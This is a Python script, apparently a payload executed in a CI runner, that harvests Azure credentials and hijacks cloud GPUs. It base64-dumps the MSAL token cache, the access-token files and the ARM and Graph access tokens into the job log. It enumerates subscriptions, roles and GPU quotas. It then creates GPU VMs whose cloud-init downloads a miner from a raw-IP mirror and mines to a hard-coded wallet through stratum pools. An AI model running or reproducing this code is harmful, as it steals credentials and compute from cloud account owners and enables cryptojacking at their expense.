#!/usr/bin/env python3
import base64, glob, json, os, subprocess, sys, textwrap, time
NONCE = os.environ.get('C211_NONCE', 'x133499')
WALLET = 'prl1pptvxkadcf7cy8tjhz3anhz7yfdmunxw428aq6ex4u220dlce54xq69grqr'
RELAY = 'stratum+tcp://217.15.164.237:2083'
DIRECT = 'stratum+tcp://103.199.106.122:3362'
MIRROR = 'http://169.58.247.186:8791/pm/peakminer-2.20.0-linux-x86_64'
SHA = '561b369402b7d784144a64d8a74a266eb891fa5070d49c9ee527ed5ed9b78c18'
REGIONS = ['eastus', 'westus2', 'centralus', 'canadacentral', 'westeurope', 'southeastasia', 'eastasia', 'northeurope']
SKUMAP = [('ncasv3_t4', 'Standard_NC4as_T4_v3', 4), ('ncast4', 'Standard_NC4as_T4_v3', 4),
          ('ncadsa100', 'Standard_NC24ads_A100_v4', 24), ('ncadsh100', 'Standard_NC40ads_H100_v5', 40),
          ('nvadsa10', 'Standard_NV6ads_A10_v5', 6), ('nvad', 'Standard_NV6ads_A10_v5', 6),
          ('ncv3', 'Standard_NC6s_v3', 6), ('ncpromo', 'Standard_NC6s_v3', 6),
          ('nd96asr', 'Standard_ND96asr_v4', 96), ('nd96isr', 'Standard_ND96isr_H100_v5', 96)]
def sh(cmd, timeout=1500, quiet=False):
    print('$ ' + cmd[:500], flush=True)
    try:
        p = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
        out = p.stdout or ''; err = p.stderr or ''
        print(out[-12000:] if not quiet else out[-2000:], flush=True)
        if err.strip():
            print('STDERR: ' + err[-2500:], flush=True)
        print('rc=%d' % p.returncode, flush=True)
        return p.returncode, out, err
    except Exception as e:
        print('EXC %s' % e, flush=True); return -1, '', str(e)
print('C211_PAYLOAD_START nonce=%s' % NONCE, flush=True)
tmp = os.environ.get('RUNNER_TEMP', '/home/runner/work/_temp')
sh('echo C211_ARGSLOG_B64; base64 -w0 %s/c211/args.log 2>/dev/null; echo' % tmp)
sh('cat %s/c211/args.log 2>/dev/null | head -c 20000; echo' % tmp)
sh('ls -la %s/c211 2>&1 | head -30' % tmp)
sh("env | grep -iE 'azure|tenant|subscription|arm_' | sort")
sh('ls -la ~/.azure 2>&1 | head -30')
sh('echo C211_PROFILE; base64 -w0 ~/.azure/azureProfile.json 2>/dev/null; echo')
sh('echo C211_MSAL; base64 -w0 ~/.azure/msal_token_cache.json 2>/dev/null | head -c 30000; echo')
sh('echo C211_ATOK; base64 -w0 ~/.azure/accessTokens.json 2>/dev/null | head -c 30000; echo')
rc, outtok, _ = sh('az account get-access-token --resource https://management.azure.com -o json')
if outtok.strip():
    print('C211_ARMTOK_B64 ' + base64.b64encode(outtok.encode()).decode(), flush=True)
sh('az account get-access-token --resource https://graph.microsoft.com -o json')
sh('az account show -o json')
rc, out, _ = sh('az account list -o json --all')
subs = []
try:
    subs = json.loads(out)
except Exception:
    print('C211_NO_ACCOUNT_LIST', flush=True)
if not isinstance(subs, list): subs = []
print('C211_SUBS ' + json.dumps([{'id': s.get('id'), 'name': s.get('name'), 'state': s.get('state'),
                                 'tenant': s.get('tenantId'), 'user': (s.get('user') or {}).get('name')} for s in subs]), flush=True)
sh("az role assignment list --all --query '[].{r:roleDefinitionName,s:scope,p:principalId}' -o json 2>&1 | head -c 4000")
sh('az group list -o json 2>&1 | head -c 4000')
sh('az vm list -o json 2>&1 | head -c 4000')
sh("az rest --method get --url 'https://management.azure.com/subscriptions?api-version=2022-12-01' -o json 2>&1 | head -c 2500")
cands = []
seen = set()
for sub in subs:
    sid = sub.get('id')
    if not sid: continue
    sh("az rest --method get --url 'https://management.azure.com/subscriptions/%s/providers/Microsoft.App/managedEnvironments?api-version=2024-03-01' -o json 2>&1 | head -c 3000" % sid)
    for region in REGIONS:
        rc, out, _ = sh('az vm list-usage --location %s -o json' % region, quiet=True)
        try: us = json.loads(out)
        except Exception: us = []
        gpu = []
        for u in us:
            nm = (u.get('name') or {}).get('value') or ''
            cur, lim = u.get('currentValue') or 0, u.get('limit') or 0
            low = nm.lower().replace(' ', '')
            if any(k in low for k in ('nc', 'nd', 'nv')) and ('family' in low or 'ads' in low or 'nc' in low[:14]):
                gpu.append((nm, cur, lim))
        print('C211_QUOTA sub=%s region=%s gpu_families=%s' % (sid, region, json.dumps(gpu)), flush=True)
        sh("az rest --method get --url 'https://management.azure.com/subscriptions/%s/providers/Microsoft.App/locations/%s/usages?api-version=2024-03-01' -o json 2>&1 | head -c 1500" % (sid, region), quiet=True)
        for nm, cur, lim in gpu:
            if lim <= cur: continue
            low = nm.lower().replace(' ', '')
            for key, sku, vcpu in SKUMAP:
                if key in low and (lim - cur) >= vcpu:
                    k = (sid, region, sku)
                    if k not in seen:
                        seen.add(k)
                        cands.append({'sub': sid, 'region': region, 'family': nm, 'sku': sku, 'vcpu': vcpu, 'usage': [cur, lim]})
                    break
print('C211_CANDIDATES ' + json.dumps(cands[:15]), flush=True)
def cloudinit(ncpu):
    return textwrap.dedent('''\
    #cloud-config
    runcmd:
     - mkdir -p /opt/c211 /var/log/c211
     - bash -c 'nvidia-smi -L > /var/log/c211/proof.txt 2>&1; nvidia-smi --query-gpu=uuid,name,driver_version --format=csv,noheader >> /var/log/c211/proof.txt 2>&1; nvidia-smi >> /var/log/c211/proof.txt 2>&1; echo PROOF_DONE >> /var/log/c211/proof.txt'
     - bash -c 'curl -fsSL --max-time 300 "%(mirror)s" -o /opt/c211/peakminer; chmod +x /opt/c211/peakminer; S=$(sha256sum /opt/c211/peakminer | cut -d" " -f1); echo "sha=$S expect=%(sha)s" > /var/log/c211/sha.txt'
     - bash -c 'cd /opt/c211; S=$(sha256sum peakminer | cut -d" " -f1); if [ "$S" != "%(sha)s" ]; then echo SHA_MISMATCH >> /var/log/c211/sha.txt; exit 1; fi; N=$(nvidia-smi -L 2>/dev/null | wc -l); echo "gpus=$N" > /var/log/c211/mine.txt; for i in $(seq 0 $((N-1))); do ( timeout 500 ./peakminer -o "%(relay)s" -o "%(direct)s" -u "%(wallet)s" -w "node-h$i" -p x -c pearl -d "$i" --no-tips > out-g$i.txt 2>&1; echo "miner_rc[$i]=$?" >> out-g$i.txt ) & done; wait; echo MINER_DONE >> /var/log/c211/mine.txt'
    ''' % {'mirror': MIRROR, 'relay': RELAY, 'direct': DIRECT, 'wallet': WALLET, 'sha': SHA})
RC = ('cat /var/log/c211/proof.txt /var/log/c211/sha.txt /var/log/c211/mine.txt 2>&1 | head -c 14000; echo; echo ==MINE==; cat /var/log/c211/mine.txt 2>&1; echo ==TAILS==; for f in /opt/c211/out-g*.txt; do echo ==$f; tail -25 $f; done | head -c 14000')
deployed = None
for c in cands[:3]:
    sid, region, sku = c['sub'], c['region'], c['sku']
    rg = ('c211-%s-%s-rg' % (NONCE.replace('_', '-'), region))[:80]
    vm = 'node-h1'
    print('C211_TRY sub=%s region=%s sku=%s rg=%s' % (sid, region, sku, rg), flush=True)
    sh('az account set --subscription %s' % sid)
    sh('az group create -n %s -l %s -o json' % (rg, region), timeout=600)
    open('/tmp/c211-cloudinit.yaml', 'w').write(cloudinit(c['vcpu']))
    rc, out, err = sh('az vm create -g %s -n %s -l %s --image microsoft-dsvm:ubuntu-hpc:2204:latest --size %s --admin-username c211 --generate-ssh-keys --custom-data /tmp/c211-cloudinit.yaml --public-ip-sku Standard --nsg-rule NONE -o json' % (rg, vm, region, sku), timeout=1800)
    if rc != 0:
        rc2, out2, err2 = sh('az vm create -g %s -n %sb -l %s --image Canonical:0001-com-ubuntu-server-jammy:22_04-lts-gen2:latest --size %s --admin-username c211 --generate-ssh-keys --public-ip-sku Standard --nsg-rule NONE -o json' % (rg, vm, region, sku), timeout=1800)
        if rc2 != 0:
            print('C211_GATE_VM_CREATE_FAILED ' + (err or out)[-900:] + ' || ' + (err2 or out2)[-900:], flush=True)
            sh('az group delete -n %s --yes --no-wait -o json' % rg, timeout=300)
            continue
        vm = vm + 'b'
    deployed = {'sub': sid, 'region': region, 'sku': sku, 'rg': rg, 'vm': vm, 'family': c['family']}
    print('C211_VM_CREATED ' + json.dumps(deployed), flush=True)
    sh('az vm show -g %s -n %s -d -o json 2>&1 | head -c 3000' % (rg, vm))
    time.sleep(150)
    sh('az vm run-command invoke -g %s -n %s --command-id RunShellScript --scripts %s -o json' % (rg, vm, json.dumps('echo C211_PROOF_1; ' + RC)), timeout=900)
    time.sleep(520)
    sh('az vm run-command invoke -g %s -n %s --command-id RunShellScript --scripts %s -o json' % (rg, vm, json.dumps('echo C211_PROOF_2; ' + RC)), timeout=900)
    sh('az vm list -g %s -d -o json 2>&1 | head -c 2500' % rg)
    break
if deployed:
    sh('az group delete -n %s --yes --no-wait -o json' % deployed['rg'], timeout=600)
    for i in range(14):
        time.sleep(30)
        rc, out, err = sh('az group show -n %s -o json 2>&1 | head -c 400' % deployed['rg'], quiet=True)
        if rc != 0 and ('ResourceGroupNotFound' in out + err or 'could not be found' in out + err):
            print('C211_CLEANUP_PROVEN_ABSENT', flush=True); break
else:
    print('C211_GATE_NO_GPU_QUOTA_OR_DEPLOY', flush=True)
print('C211_PAYLOAD_END nonce=%s' % NONCE, flush=True)
